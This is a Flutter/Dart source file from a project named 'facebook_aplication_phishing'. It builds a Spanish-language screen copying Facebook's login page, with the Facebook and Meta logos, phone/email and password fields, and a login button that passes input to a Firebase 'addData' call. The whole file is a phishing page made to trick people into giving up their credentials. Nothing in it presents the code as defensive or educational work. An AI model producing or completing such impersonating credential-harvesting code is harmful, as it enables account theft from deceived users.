import 'package:facebook_aplication_phishing/services/firebase_service.dart';
import 'package:flutter/material.dart';

class HomePage extends StatefulWidget {
  const HomePage({Key? key}) : super(key: key);

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  TextEditingController datacontroller = TextEditingController(text: "");
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Column(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          Divider(
            height: 6.0,
            color: Colors.transparent,
          ),
          Column(
            mainAxisAlignment: MainAxisAlignment.spaceAround,
            children: [
              Text("Español"),
              Divider(
                height: 40,
                color: Colors.transparent,
              ),
              SizedBox(
                  width: 60.0,
                  height: 60.0,
                  child: Image(image: AssetImage("assets/logo.png"))),
            ],
          ),

          ////////////////////PART N° 3///////////////////////
          Padding(
            padding: const EdgeInsets.all(10.0),
            child: Column(
              children: [
                TextField(
                    cursorColor: Colors.black,
                    decoration: InputDecoration(
                        hintText: "Celular o correo electrónico",
                        border: OutlineInputBorder())),
                Divider(
                  height: 20.0,
                  color: Colors.transparent,
                ),
                TextFormField(
                  obscureText: true,
                  decoration: InputDecoration(
                      hintText: "Contraseña",
                      border: OutlineInputBorder(
                          borderSide:
                              BorderSide(color: Colors.green, width: 3))),
                ),
                Divider(
                  height: 20.0,
                  color: Colors.transparent,
                ),
                ElevatedButton(
                    style:
                        ElevatedButton.styleFrom(primary: Color(0xFFF1877f2)),
                    onPressed: () async {
                      await addData(datacontroller.text);
                      //Navigator.pop(context);
                    },
                    child: Container(
                      height: 50,
                      width: 370,
                      child: Center(child: Text("Iniciar sesión")),
                    ))
              ],
            ),
          ),
          //////////////////////////////fINISH PART 3////////////////
          Padding(
            padding: const EdgeInsets.all(10.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.spaceAround,
              children: [
                Text("¿Olvidaste tu contraseña?"),
                Divider(
                  height: 15.0,
                  color: Colors.transparent,
                ),
                ElevatedButton(
                    child: SizedBox(
                      width: 350,
                      child: Center(
                        child: Text(
                          "Crear cuenta nueva",
                          style: TextStyle(color: Colors.black),
                        ),
                      ),
                    ),
                    onPressed: () {},
                    style: ElevatedButton.styleFrom(
                      elevation: 0.0,
                      primary: Colors.red.withOpacity(0),
                      shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.all(
                            Radius.circular(2),
                          ),
                          side: BorderSide(color: Colors.black26)),
                    )),
                Container(
                  width: 80,
                  height: 80,
                  child: Image(image: AssetImage("assets/meta.png")),
                )
              ],
            ),
          ),
        ],
      ),
    );
  }
}
